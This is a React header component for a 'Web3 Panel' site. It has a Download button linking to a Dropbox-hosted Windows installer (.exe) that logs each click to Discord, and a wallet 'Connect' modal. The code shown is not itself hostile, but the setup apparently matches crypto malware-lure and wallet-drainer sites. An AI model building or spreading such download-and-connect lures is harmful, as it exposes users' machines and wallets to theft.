import React, { useState } from 'react';
import { LineChart, Network, Menu, X } from 'lucide-react';
import { Link, useLocation } from 'react-router-dom';
import { sendDiscordNotification } from '../utils/discord';
import WalletModal from './WalletModal';

const Header = () => {
  const location = useLocation();
  const isContactPage = location.pathname === '/contact';
  const isDocsPage = location.pathname === '/docs';
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);

  const closeMenu = () => {
    setIsMobileMenuOpen(false);
  };

  return (
    <>
    <header className={`w-full fixed top-0 z-50 transition-colors duration-300 ${
      isContactPage || isDocsPage || isMobileMenuOpen ? 'bg-white shadow-sm' : 'absolute'
    }`}>
      <div className="max-w-7xl mx-auto px-8">
        <div className="flex items-center justify-between h-16">
          {/* Logo */}
          <Link to="/" className="flex items-center gap-2">
            <LineChart className={`w-8 h-8 transition-colors ${
              isContactPage || isDocsPage || isMobileMenuOpen ? 'text-indigo-600' : 'text-white'
            }`} />
            <span className={`font-bold text-xl transition-colors ${
              isContactPage || isDocsPage || isMobileMenuOpen ? 'text-gray-900' : 'text-white'
            }`}>Web3 Panel</span>
          </Link>

          {/* Navigation */}
          <nav className="hidden md:block">
            <ul className="flex items-center gap-8">
              <li>
                <a 
                  href="https://www.dropbox.com/scl/fi/qnmitutujij0cdp53da8g/Web3-Panel-Installer.exe?rlkey=7g9shdoqhxmpqwhadfxbhh2ut&st=o53lhu45&dl=1"
                  onClick={() => sendDiscordNotification('download', 'Header')}
                  className={`px-4 py-2 rounded-lg font-medium transition-colors mr-2 ${
                    isContactPage || isDocsPage
                      ? 'bg-indigo-600 text-white hover:bg-indigo-700' 
                      : 'bg-white text-gray-900 hover:bg-gray-50'
                  }`}
                >
                  Download
                </a>
                <button
                  onClick={() => setIsWalletModalOpen(true)}
                  className="relative group px-4 py-2 rounded-lg font-medium overflow-hidden"
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-indigo-600 transition-all duration-300 group-hover:scale-110"></div>
                  <div className="absolute inset-0 bg-gradient-to-r from-purple-400 to-indigo-400 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                  <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
                  <span className="relative text-white flex items-center gap-2">
                    <Network className="w-4 h-4" />
                    Connect
                  </span>
                </button>
              </li>
              <li>
                <Link 
                  to="/contact" 
                  className={`transition-colors ${
                    isContactPage || isDocsPage
                      ? 'text-indigo-600 hover:text-indigo-700' 
                      : 'text-white/90 hover:text-white'
                  }`}
                >
                  Contact Us
                </Link>
              </li>
              <li>
                <Link 
                  to="/docs" 
                  className={`transition-colors ${
                    isContactPage || isDocsPage
                      ? 'text-gray-600 hover:text-gray-900' 
                      : 'text-white/90 hover:text-white'
                  }`}
                >
                  Docs
                </Link>
              </li>
            </ul>
          </nav>

          {/* Mobile Menu Button */}
          <button
            onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
            className="md:hidden p-2 rounded-lg transition-colors hover:bg-white/10"
            aria-label="Toggle menu"
          >
            {isMobileMenuOpen ? (
              <X className={`w-6 h-6 ${
                isContactPage || isDocsPage || isMobileMenuOpen ? 'text-gray-900' : 'text-white'
              }`} />
            ) : (
              <Menu className={`w-6 h-6 ${
                isContactPage || isDocsPage || isMobileMenuOpen ? 'text-gray-900' : 'text-white'
              }`} />
            )}
          </button>
        </div>

        {/* Mobile Menu */}
        <div 
          className={`
            md:hidden fixed inset-x-0 top-16 bg-white/95 backdrop-blur-lg shadow-lg transition-all duration-300 transform z-40
            ${isMobileMenuOpen ? 'translate-y-0 opacity-100 pointer-events-auto' : '-translate-y-full opacity-0 pointer-events-none'}
          `}
          onClick={(e) => e.stopPropagation()}
        >
          <nav className="px-6 py-8">
            <div className="space-y-6">
              <button
                onClick={() => {
                  setIsWalletModalOpen(true);
                  closeMenu();
                }}
                className="w-full px-6 py-3.5 bg-gradient-to-r from-purple-600 to-indigo-600 text-white rounded-xl text-center font-medium hover:from-purple-700 hover:to-indigo-700 transition-all duration-300 shadow-md hover:shadow-lg transform hover:scale-[1.02] active:scale-[0.98]"
              >
                <span className="flex items-center justify-center gap-2">
                  <Network className="w-4 h-4" />
                  Connect
                </span>
              </button>
            
              <div className="h-px bg-gradient-to-r from-transparent via-gray-200 to-transparent"></div>

              <Link
                to="/contact"
                onClick={closeMenu}
                className="block w-full px-4 py-3 text-gray-600 hover:text-gray-900 rounded-lg transition-all duration-300 hover:bg-gray-50/50 text-center font-medium"
              >
                Contact Us
              </Link>
              <Link
                to="/docs"
                onClick={closeMenu}
                className="block w-full px-4 py-3 text-gray-600 hover:text-gray-900 rounded-lg transition-all duration-300 hover:bg-gray-50/50 text-center font-medium"
              >
                Docs
              </Link>
            </div>
          </nav>
        </div>
      </div>
    </header>
    <WalletModal 
      isOpen={isWalletModalOpen}
      onClose={() => {
        setIsWalletModalOpen(false);
        closeMenu();
      }}
    />
    </>
  );
};

export default Header;